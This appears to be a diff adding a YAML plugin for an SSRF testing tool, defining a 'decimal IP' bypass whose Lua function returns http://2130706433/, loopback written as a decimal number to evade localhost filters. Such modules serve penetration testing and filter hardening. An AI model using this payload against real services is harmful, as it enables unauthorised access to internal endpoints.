@@ -1,0 +1,24 @@
+meta:
+  id: decimal_ip
+  version: 1
+  name: "Decimal IP Representation"
+  description: "Uses decimal representation of IPv4 (2130706433)"
+  author: "SSRFdevil"
+  created: "2026-06-19"
+  updated: "2026-06-19"
+  rank: 80
+  confidence: 90
+  severity: high
+  tags: [decimal, ipv4, encoding, bypass]
+  references: []
+match:
+  schemes: [http, https]
+  requires: [hostname]
+  supports: [ipv4]
+script:
+  language: lua
+  entry: bypass
+  source: |
+    function bypass(ctx)
+      return { url = "http://2130706433/" }
+    end
